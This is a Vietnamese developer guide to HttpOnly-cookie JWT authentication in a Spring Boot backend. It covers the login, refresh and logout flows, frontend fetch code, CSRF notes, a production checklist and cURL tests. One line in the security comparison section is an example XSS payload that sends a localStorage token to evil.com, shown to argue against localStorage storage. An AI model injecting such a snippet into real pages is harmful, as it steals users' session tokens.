# 🔐 HttpOnly Cookie Authentication Guide

## ✅ Đã Implement

Backend Spring Boot đã được cấu hình để sử dụng **HttpOnly Cookies** cho Access Token và Refresh Token.

---

## 📋 Cách Hoạt Động

### **1. Login**

**Request:**

```bash
POST http://localhost:8080/api/auth/login
Content-Type: application/json

{
  "username": "testuser",
  "password": "password123"
}
```

**Response:**

```json
{
  "message": "Login successful",
  "userId": "abc-123-uuid",
  "username": "testuser"
}
```

**Response Headers (Set-Cookie):**

```
Set-Cookie: accessToken=eyJhbGci...; Path=/; Max-Age=900; HttpOnly; SameSite=Lax
Set-Cookie: refreshToken=eyJhbGci...; Path=/api/auth/refresh; Max-Age=604800; HttpOnly; SameSite=Lax
```

**Đặc điểm cookies:**

- ✅ **HttpOnly**: JavaScript không thể đọc → Chống XSS
- ✅ **SameSite=Lax**: Chống CSRF attack
- ✅ **Secure=false**: Development mode (Set `true` khi production với HTTPS)
- ✅ **Path**:
  - Access Token: `/` (gửi cho mọi endpoint)
  - Refresh Token: `/api/auth/refresh` (chỉ gửi khi refresh)

---

### **2. API Calls (Tự Động Gửi Cookie)**

Browser tự động gửi cookie trong mọi request:

```bash
GET http://localhost:8080/api/users/profile
# Cookie tự động được gửi kèm:
# Cookie: accessToken=eyJhbGci...
```

**Backend sẽ:**

1. Đọc `accessToken` từ cookie
2. Validate token
3. Cho phép/từ chối request

---

### **3. Refresh Token**

Khi access token hết hạn (sau 15 phút):

**Request:**

```bash
POST http://localhost:8080/api/auth/refresh
# Không cần body
# Browser tự động gửi refreshToken cookie
```

**Response:**

```json
{
  "message": "Token refreshed successfully",
  "userId": "abc-123",
  "username": "testuser"
}
```

**Response Headers:**

```
Set-Cookie: accessToken=NEW_TOKEN...; Path=/; Max-Age=900; HttpOnly; SameSite=Lax
```

---

### **4. Logout**

**Request:**

```bash
POST http://localhost:8080/api/auth/logout
Content-Type: application/json

{
  "username": "testuser"
}
```

**Response Headers (Xóa Cookies):**

```
Set-Cookie: accessToken=; Path=/; Max-Age=0; HttpOnly
Set-Cookie: refreshToken=; Path=/api/auth/refresh; Max-Age=0; HttpOnly
```

---

## 🌐 Frontend Implementation

### **React/Vue/Angular Example**

```javascript
// 1. LOGIN
async function login(username, password) {
  const response = await fetch("http://localhost:8080/api/auth/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    credentials: "include", // ⚠️ QUAN TRỌNG: Gửi và nhận cookies
    body: JSON.stringify({ username, password }),
  });

  const data = await response.json();
  console.log("Logged in:", data);
  // Cookies được tự động lưu bởi browser
  // KHÔNG CẦN localStorage.setItem() nữa!
}

// 2. CALL API (Tự động gửi cookie)
async function getUserProfile() {
  const response = await fetch("http://localhost:8080/api/users/profile", {
    method: "GET",
    credentials: "include", // ⚠️ QUAN TRỌNG: Gửi cookies
  });

  const data = await response.json();
  return data;
}

// 3. REFRESH TOKEN (Khi access token hết hạn)
async function refreshAccessToken() {
  const response = await fetch("http://localhost:8080/api/auth/refresh", {
    method: "POST",
    credentials: "include", // ⚠️ Gửi refreshToken cookie
  });

  if (response.ok) {
    console.log("Token refreshed");
    return true;
  }

  // Nếu refresh token hết hạn → Redirect to login
  window.location.href = "/login";
  return false;
}

// 4. INTERCEPTOR (Tự động refresh khi access token hết hạn)
async function fetchWithAutoRefresh(url, options = {}) {
  options.credentials = "include";

  let response = await fetch(url, options);

  // Nếu 401 Unauthorized → Thử refresh token
  if (response.status === 401) {
    const refreshed = await refreshAccessToken();

    if (refreshed) {
      // Retry request với access token mới
      response = await fetch(url, options);
    }
  }

  return response;
}

// 5. LOGOUT
async function logout(username) {
  await fetch("http://localhost:8080/api/auth/logout", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    credentials: "include",
    body: JSON.stringify({ username }),
  });

  window.location.href = "/login";
}
```

---

## 🔒 Bảo Mật So Sánh

### **❌ localStorage/sessionStorage (Không an toàn)**

```javascript
// XSS attack có thể đánh cắp token:
localStorage.setItem("accessToken", token);
// → Hacker inject script:
//    <script>fetch('https://evil.com?token=' + localStorage.getItem('accessToken'))</script>
```

### **✅ HttpOnly Cookie (An toàn hơn)**

```javascript
// JavaScript KHÔNG THỂ đọc HttpOnly cookie
document.cookie; // → "" (empty)
// Hacker không thể dùng XSS để đánh cắp token
```

---

## 🛡️ Bảo Vệ CSRF Attack

**CSRF Attack là gì?**

- Evil site tạo request đến API của bạn
- Browser tự động gửi cookie kèm theo
- → API nghĩ đó là request hợp lệ

**Cách phòng chống:**

1. ✅ **SameSite=Lax**: Cookie không gửi từ cross-site requests
2. ✅ **CORS với credentials**: Chỉ cho phép origins được whitelist
3. ⚠️ **Cân nhắc CSRF Token** nếu cần bảo mật cao hơn

---

## 🚀 Production Checklist

Khi deploy lên production:

### **1. Enable HTTPS**

```java
.secure(true)  // Thay vì secure(false)
```

### **2. Cập nhật CORS Origins**

```java
configuration.setAllowedOrigins(Arrays.asList(
    "https://your-frontend.com",
    "https://www.your-frontend.com"
));
```

### **3. Sử dụng Environment Variables cho SECRET_KEY**

```java
// JwtUtil.java
@Value("${jwt.secret}")
private String SECRET_KEY;
```

```properties
# application.properties
jwt.secret=${JWT_SECRET_KEY}
```

### **4. Tăng thời gian Refresh Token nếu cần**

```java
private static final long REFRESH_TOKEN_VALIDITY = 30 * 24 * 60 * 60 * 1000; // 30 ngày
```

---

## 📊 Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                        CLIENT (Browser)                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Login(username, password)                                │
│     ↓                                                        │
│  2. Nhận cookies từ Set-Cookie header                        │
│     - accessToken (HttpOnly, 15 phút)                        │
│     - refreshToken (HttpOnly, 7 ngày)                        │
│     ↓                                                        │
│  3. Browser TỰ ĐỘNG lưu cookies                             │
│     ↓                                                        │
│  4. Mọi request sau đó TỰ ĐỘNG gửi cookies                  │
│     GET /api/users/profile                                   │
│     Cookie: accessToken=eyJhbGci...                          │
│     ↓                                                        │
│  5. Nếu 401 Unauthorized → Call /refresh                     │
│     POST /api/auth/refresh                                   │
│     Cookie: refreshToken=eyJhbGci...                         │
│     ↓                                                        │
│  6. Nhận accessToken mới → Retry request                     │
│     ↓                                                        │
│  7. Logout → Cookies bị xóa (maxAge=0)                       │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## ✅ Ưu Điểm HttpOnly Cookies

1. ✅ **Chống XSS**: JavaScript không thể đọc
2. ✅ **Tự động**: Browser tự động gửi kèm mọi request
3. ✅ **Đơn giản**: Frontend không cần quản lý tokens
4. ✅ **Bảo mật**: Kết hợp với SameSite, Secure, CORS

## ⚠️ Lưu Ý

1. ⚠️ **Cần CORS đúng**: Set `credentials: 'include'` và backend config CORS
2. ⚠️ **Không dùng cho Mobile App**: HttpOnly cookies chỉ cho web browser
3. ⚠️ **Cần HTTPS trong production**: Nếu không, cookies có thể bị đánh cắp

---

## 🧪 Test với cURL

```bash
# 1. Login và lưu cookies
curl -c cookies.txt -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"123456"}'

# 2. Call API với cookies
curl -b cookies.txt http://localhost:8080/api/users/profile

# 3. Refresh token
curl -b cookies.txt -c cookies.txt -X POST http://localhost:8080/api/auth/refresh

# 4. Logout
curl -b cookies.txt -X POST http://localhost:8080/api/auth/logout \
  -H "Content-Type: application/json" \
  -d '{"username":"test"}'
```

---

## 📝 Tóm Tắt

- ✅ Tokens được lưu trong **HttpOnly Cookies** (không phải localStorage)
- ✅ **JavaScript không thể đọc** cookies → Chống XSS
- ✅ Browser **tự động gửi** cookies trong mọi request
- ✅ Frontend chỉ cần set `credentials: 'include'`
- ✅ **SameSite=Lax** chống CSRF attack
- ✅ Production cần **HTTPS** và **secure=true**
